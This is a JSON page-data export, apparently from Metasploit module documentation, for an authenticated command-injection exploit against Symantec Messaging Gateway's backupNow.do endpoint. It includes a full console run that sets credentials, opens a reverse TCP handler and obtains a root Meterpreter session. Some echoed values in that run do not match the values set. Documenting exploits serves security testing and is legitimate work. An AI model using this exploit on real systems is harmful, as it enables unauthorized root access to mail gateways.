{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/symantec_messaging_gateway_exec","result":{"data":{"moduleMetadataJson":{"id":"ec944892-fab2-548c-90b1-8a8c90aa0098","name":"Symantec Messaging Gateway Remote Code Execution","fullname":"exploit/linux/http/symantec_messaging_gateway_exec","description":"This module exploits the command injection vulnerability of Symantec Messaging Gateway product. An authenticated user can execute a\n        terminal command under the context of the web server user which is root.\n\n        backupNow.do endpoint takes several user inputs and then pass them to the internal service which is responsible for executing\n        operating system command. One of the user input is being passed to the service without proper validation. That cause a command\n        injection vulnerability. But given parameters, such a SSH ip address, port and credentials are validated before executing terminal\n        command. Thus, you need to configure your own SSH service and set the required parameter during module usage.\n\n        This module was tested against Symantec Messaging Gateway 10.6.2-7.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/symantec_messaging_gateway_exec","documentationSlug":"/modules/documentation/exploit/linux/http/symantec_messaging_gateway_exec"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module exploits the command injection vulnerability of Symantec Messaging Gateway product. An authenticated user can execute a\nterminal command under the context of the web server user which is root.</p>\n<p>backupNow.do endpoint takes several user inputs and then pass them to the internal service which is responsible for executing\noperating system command. One of the user input is being passed to the service without proper validation. That cause an command\ninjection vulnerability. But given parameters, such a SSH ip address, port and credentials are validated before executing terminal\ncommand. Thus, you need to configure your own SSH service and set the required parameter during module usage.</p>\n<p><strong>Vulnerable Application Installation Steps</strong></p>\n<p>Click on the \"free trial\" button at the following URL.\n<a href=\"https://www.symantec.com/products/messaging-security/messaging-gateway\">https://www.symantec.com/products/messaging-security/messaging-gateway</a></p>\n<p>You need to complete the reqistration in order to download ISO file. License file will be delivered to your e-mail address</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>A successful check of the exploit will look like this:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/linux/http/symantec_messaging_gateway_exec \nmsf exploit(symantec_messaging_gateway_exec) &gt; set RHOST 12.0.0.199\nRHOST =&gt; 12.0.0.199\nmsf exploit(symantec_messaging_gateway_exec) &gt; set LHOST 12.0.0.1 \nLHOST =&gt; 12.0.0.1\nmsf exploit(symantec_messaging_gateway_exec) &gt; set USERNAME admin\nUSERNAME =&gt; admin\nmsf exploit(symantec_messaging_gateway_exec) &gt; set PASSWORD qwe123\nPASSWORD =&gt; qwe123\nmsf exploit(symantec_messaging_gateway_exec) &gt; set SSH_ADDRESS 12.0.0.15\nSSH_ADDRESS =&gt; 127.0.0.1\nmsf exploit(symantec_messaging_gateway_exec) &gt; set SSH_USERNAME root\nSSH_USERNAME =&gt; root\nmsf exploit(symantec_messaging_gateway_exec) &gt; set SSH_PASSWORD toor\nSSH_PASSWORD =&gt; qwe123\nmsf exploit(symantec_messaging_gateway_exec) &gt; run\n\n[*] Started reverse TCP handler on 12.0.0.1:4444 \n[*] Performing authentication...\n[+] Awesome..! Authenticated with admin:qwe123\n[*] Capturing CSRF token\n[+] CSRF token is : 48f39f735f15fcaccd0aacc40b27a67bf76f2bb1\n[*] Sending stage (39842 bytes) to 12.0.0.199\n[*] Meterpreter session 1 opened (12.0.0.1:4444 -&gt; 12.0.0.199:53018) at 2017-04-30 14:00:12 +0300\n\nmeterpreter &gt; getuid\nServer username: root\nmeterpreter &gt; sysinfo\nComputer        : hacker.dev\nOS              : Linux 2.6.32-573.3.1.el6.x86_64 #1 SMP Thu Aug 13 22:55:16 UTC 2015\nArchitecture    : x64\nSystem Language : en_US\nMeterpreter     : python/linux\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"ec944892-fab2-548c-90b1-8a8c90aa0098"}}}